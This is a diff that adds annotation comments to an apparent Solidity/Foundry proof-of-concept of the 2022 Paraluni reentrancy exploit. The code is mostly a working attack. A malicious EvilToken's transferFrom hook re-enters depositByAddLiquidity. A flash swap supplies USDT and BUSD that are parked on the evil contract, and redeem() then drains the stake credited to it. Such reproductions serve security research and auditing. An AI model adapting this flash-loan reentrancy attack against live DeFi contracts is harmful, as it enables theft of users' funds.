@@ -5,6 +5,12 @@ pragma solidity >=0.7.0 <0.9.0;
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
+// ============================================================
+// VULNERABILITY (EvilToken - attacker controlled "token")
+// Used as a fake leg in depositByAddLiquidity to hijack the router's internal
+// transferFrom during addLiquidity (different caller than MC) and perform
+// reentrant value-adding deposit under Evil's address.
+// ============================================================
 contract EvilToken {
     IMasterChef masterchef;
     IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -27,9 +33,15 @@ contract EvilToken {
     }
 
     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        // ============================================================
+        // VULNERABILITY: Malicious token hook
+        // Called by router (not MC) during addLiquidity inside depositByAddLiquidity
+        // → condition passes → reenters with real USDT/BUSD parked on this contract.
+        // ============================================================
         if (address(masterchef) != address(0) && address(msg.sender) != address(masterchef)) {
             usdt.approve(address(masterchef), 2 ** 256 - 1);
             busd.approve(address(masterchef), 2 ** 256 - 1);
+            // EXPLOIT: reentrant real-value deposit credits stake to EvilToken address
             masterchef.depositByAddLiquidity(
                 18, [address(usdt), address(busd)], [usdt.balanceOf(address(this)), busd.balanceOf(address(this))]
             );
@@ -59,6 +71,13 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // ============================================================
+        // EXPLOIT OVERVIEW (2022-03-Paraluni)
+        // VULNERABILITY: depositByAddLiquidity blindly accepts attacker-chosen tokens,
+        // performs router.addLiquidity on them (exposing transferFrom callback from router),
+        // updates user stake after the fact → reentrancy from hook allows parking value on
+        // hook contract + depositing it under hook's identity.
+        // ============================================================
         token0 = new EvilToken(IMasterChef(address(0)));
         token1 = new EvilToken(masterchef);
         pair.swap(10_000 * 1e18, 10_000 * 1e18, address(this), new bytes(1));
@@ -70,15 +89,26 @@ contract ContractTest is Test {
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+        // EXPLOIT STEP: park flash liquidity on malicious token1
         usdt.transfer(address(token1), usdt.balanceOf(address(this)));
         busd.transfer(address(token1), busd.balanceOf(address(this)));
+
+        // VULNERABILITY + EXPLOIT: deposit using EvilTokens as "LP tokens" for pid 18.
+        // Internals of depositByAddLiquidity → router.addLiquidity → router.transferFrom(token1)
+        // (router != MC) → Evil.transferFrom reenters depositByAddLiquidity with real funds
+        // crediting the stake to address(token1) not to this attacker.
         masterchef.depositByAddLiquidity(18, [address(token0), address(token1)], [uint256(1), uint256(1)]);
+
+        // Withdraw attacker's (tiny) recorded position from the outer call
         (uint256 _amount,) = masterchef.userInfo(18, address(this));
         masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
         address[] memory t = new address[](2);
         t[0] = address(busd);
         t[1] = address(usdt);
         masterchef.withdrawChange(t);
+
+        // EXPLOIT: redeem drains the large stake credited *to the EvilToken contract*
+        // via the reentrant deposit inside its hook.
         token1.redeem();
         usdt.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
         busd.transfer(msg.sender, ((amount1 / 9975) * 10_000) + 10_000);
